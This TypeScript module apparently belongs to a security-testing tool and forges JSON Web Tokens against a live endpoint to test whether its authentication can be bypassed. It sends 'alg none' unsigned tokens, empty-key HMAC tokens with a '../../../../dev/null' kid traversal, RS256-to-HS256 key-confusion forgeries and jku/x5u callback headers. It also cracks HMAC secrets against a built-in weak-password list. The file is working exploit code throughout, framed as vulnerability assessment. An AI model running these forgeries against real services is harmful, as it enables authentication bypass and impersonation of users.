import { fetchUrl, type FetchResult } from "../adapters/http.js";
import { writeArtifact } from "../adapters/artifacts.js";
import { createHmac, randomBytes } from "node:crypto";

export interface JwtAttackInput {
  readonly token: string;
  readonly endpoint: string;
  readonly outputRoot: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
  readonly secretCandidates?: readonly string[];
  /** Exact public-key bytes the verifier is configured to use. Never a TLS certificate substitute. */
  readonly publicKeyPem?: string;
  /** Optional stable application proof. Paths are dotted JSON paths. */
  readonly identityPath?: string;
  readonly expectedIdentity?: string | number | boolean;
  readonly proofMarker?: string;
  /** Header URL probes are candidates, not SSRF confirmation. */
  readonly callbackUrl?: string;
}
export interface JwtAttackResult {
  readonly tokenPreview: string;
  readonly claims: { roles: string[]; scopes: string[]; permissions: string[]; subject: string | null; issuer: string | null; audience: string | null };
  readonly header: Record<string, unknown>;
  readonly oracle: { valid: boolean; reason: string; proof: string[]; original: number[]; invalid: number[]; anonymous: number[] };
  readonly attacks: { name: string; detail: string; baseline: number; tampered: number; verdict: "vulnerable" | "safe" | "inconclusive"; scope?: "offline-signature" | "authentication" | "candidate" }[];
  readonly artifacts: { path: string; bytes: number }[];
}
const enc = (s: string | Buffer): string => Buffer.from(s).toString("base64url");
const list = (v: unknown): string[] => Array.isArray(v) ? v.map(String) : typeof v === "string" ? v.split(/[ ,|]+/).filter(Boolean) : [];
const secrets = ["secret", "password", "123456", "jwt_secret", "key", "your-256-bit-secret", "changeme", "admin", "test", "s3cr3t", "jwt", "token", "hs256-secret", "mysecret", "qwerty"];
const cleanHeaders = (h: Record<string, string> = {}): Record<string, string> => Object.fromEntries(Object.entries(h).map(([k, v]) => [k.toLowerCase(), v]).filter(([k]) => !/^(?:cookie|authorization|proxy-authorization|x-.*(?:key|token|auth|csrf)|api-key|if-none-match|if-modified-since)$/.test(k!)));
const usable = (r: FetchResult): boolean => r.status > 0 && r.status !== 429 && r.status < 500 && !r.error && (r as FetchResult & { complete?: boolean }).complete !== false;
const success = (r: FetchResult): boolean => usable(r) && r.status >= 200 && r.status < 300;
const denied = (r: FetchResult): boolean => usable(r) && ([401, 403].includes(r.status) || (r.status >= 200 && r.status < 300 && /"(?:error|message)"\s*:\s*"[^"\n]*(?:unauthenticated|unauthorized|invalid token|authentication required|not authenticated)/i.test(r.body)));
const leaves = (text: string): Map<string, string> => {
  const out = new Map<string, string>();
  const walk = (v: unknown, path: string, depth: number): void => {
    if (depth > 24 || out.size > 4000) return;
    if (v !== null && typeof v === "object") { for (const [k, x] of Object.entries(v)) walk(x, path ? `${path}.${k}` : k, depth + 1); }
    else if (v !== null && v !== "") out.set(path, JSON.stringify(v));
  };
  try { walk(JSON.parse(text), "", 0); } catch { /* a stable raw body can still supply an authentication differential */ }
  return out;
};

export const probeJwtAttack = async (input: JwtAttackInput): Promise<JwtAttackResult> => {
  if (!/^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/.test(input.token)) throw new Error("invalid JWT compact encoding");
  const [h, p, signature] = input.token.split(".") as [string, string, string];
  const header = JSON.parse(Buffer.from(h, "base64url").toString()) as Record<string, unknown>;
  const payload = JSON.parse(Buffer.from(p, "base64url").toString()) as Record<string, unknown>;
  if (!header || !payload || Array.isArray(header) || Array.isArray(payload) || typeof header !== "object" || typeof payload !== "object") throw new Error("JWT header/payload must be objects");
  const headers = cleanHeaders(input.headers);
  const endpoint = new URL(input.endpoint);
  for (const k of [...endpoint.searchParams.keys()]) if (/^(?:access_token|token|api[_-]?key|auth|jwt|session)$/i.test(k)) endpoint.searchParams.delete(k);
  const call = (tok?: string): Promise<FetchResult> => fetchUrl(endpoint.toString(), { proxy: input.proxy, timeoutMs: input.timeoutMs ?? 8000, redirect: "manual", method: "GET", headers: { ...headers, ...(tok === undefined ? {} : { authorization: `Bearer ${tok}` }) } });
  const original = [await call(input.token), await call(input.token)];
  const invalidToken = `${h}.${p}.${enc(randomBytes(48))}`;
  const invalid = [await call(invalidToken), await call(invalidToken)];
  const anonymous = [await call(), await call()];
  const a = leaves(original[0]!.body), b = leaves(original[1]!.body);
  const proof = [...a].filter(([path, value]) => b.get(path) === value && (input.identityPath ? path === input.identityPath : /(?:^|\.)(?:sub|subject|user(?:id|name)?|id|email|tenant(?:id)?|account(?:id)?|owner(?:id)?|roles?|permissions?|scopes?)(?:\.|$)/i.test(path)) && (input.expectedIdentity === undefined || value === JSON.stringify(input.expectedIdentity)));
  const markerValid = Boolean(input.proofMarker && original.every(r => r.body.includes(input.proofMarker!)));
  const exactValid = original[0]!.body.trim().length > 0 && original[0]!.sha256 === original[1]!.sha256 && original[0]!.body === original[1]!.body;
  const matches = (r: FetchResult): boolean => success(r) && (markerValid ? r.body.includes(input.proofMarker!) : proof.length ? proof.every(([k, v]) => leaves(r.body).get(k) === v) : exactValid && r.body === original[0]!.body);
  // Require repeatable authenticated success and repeatable negative controls.
  // A generic public endpoint cannot authenticate a forged token.
  const controls = [...invalid, ...anonymous];
  const valid = original.every(success) && (proof.length > 0 || markerValid || exactValid) && controls.every(r => usable(r) && (denied(r) || (success(r) && proof.length > 0 && !matches(r)))) && controls.every(r => !matches(r));
  const oracle = { valid, reason: valid ? "repeated authenticated proof differs from invalid and anonymous controls" : "authentication proof or repeatable negative controls unavailable", proof: markerValid ? ["explicit-marker"] : proof.length ? proof.map(([k]) => k) : exactValid ? ["stable-response-with-auth-negative-controls"] : [], original: original.map(r => r.status), invalid: invalid.map(r => r.status), anonymous: anonymous.map(r => r.status) };
  const attacks: JwtAttackResult["attacks"] = [];
  const probe = async (name: string, tok: string, detail: string): Promise<void> => {
    const responses = [await call(tok), await call(tok)];
    const verdict = !valid || responses.some(r => !usable(r)) ? "inconclusive" : responses.every(matches) ? "vulnerable" : responses.every(denied) ? "safe" : "inconclusive";
    attacks.push({ name, detail, baseline: original[0]!.status, tampered: responses[0]!.status, verdict, scope: "authentication" });
  };
  await probe("alg_none", `${enc(JSON.stringify({ ...header, alg: "none" }))}.${p}.`, "unsigned credential tested against repeated authentication proof");
  const kidH = enc(JSON.stringify({ ...header, alg: "HS256", kid: "../../../../dev/null" }));
  await probe("kid_traversal_devnull", `${kidH}.${p}.${enc(createHmac("sha256", Buffer.alloc(0)).update(`${kidH}.${p}`).digest())}`, "empty-key HMAC with traversal kid; acceptance proves credential forgery, not a file read");
  if (/^RS(?:256|384|512)$/.test(String(header.alg))) {
    if (input.publicKeyPem) {
      const hs = enc(JSON.stringify({ ...header, alg: "HS256" }));
      await probe("rs_hs_confusion", `${hs}.${p}.${enc(createHmac("sha256", input.publicKeyPem).update(`${hs}.${p}`).digest())}`, "HS256 signed using explicit verifier public-key bytes");
    } else attacks.push({ name: "rs_hs_confusion", detail: "publicKeyPem required to execute public-key HMAC forgery", baseline: original[0]!.status, tampered: 0, verdict: "inconclusive", scope: "authentication" });
  }
  if (input.callbackUrl) for (const key of ["jku", "x5u"]) {
    const hh = enc(JSON.stringify({ ...header, [key]: new URL(input.callbackUrl).toString() }));
    const r = await call(`${hh}.${p}.${signature}`);
    attacks.push({ name: `${key}_ssrf`, detail: "URL-bearing header sent; only correlated callback can establish dereference", baseline: original[0]!.status, tampered: r.status, verdict: "inconclusive", scope: "candidate" });
  }
  if (/^HS(?:256|384|512)$/.test(String(header.alg))) {
    const hash = `sha${String(header.alg).slice(2)}`;
    const cracked = (input.secretCandidates ?? secrets).some(s => enc(createHmac(hash, s).update(`${h}.${p}`).digest()) === signature);
    attacks.push({ name: "weak_secret", detail: cracked ? "signature verified with a dictionary candidate; endpoint authentication is separately reported" : "no supplied dictionary candidate verifies signature", baseline: original[0]!.status, tampered: 0, verdict: cracked ? "vulnerable" : "safe", scope: "offline-signature" });
  }
  const claims = { roles: list(payload.role ?? payload.roles ?? payload["role-names"] ?? payload.authorities), scopes: list(payload.scope ?? payload.scopes), permissions: list(payload.permissions ?? payload.perms), subject: typeof payload.sub === "string" ? payload.sub : null, issuer: typeof payload.iss === "string" ? payload.iss : null, audience: Array.isArray(payload.aud) ? payload.aud.join(",") : typeof payload.aud === "string" ? payload.aud : null };
  const result = { tokenPreview: input.token.slice(0, 24), claims, header, oracle, attacks };
  return { ...result, artifacts: [await writeArtifact(input.outputRoot, "jwt_attack.json", JSON.stringify(result, null, 2))] };
};
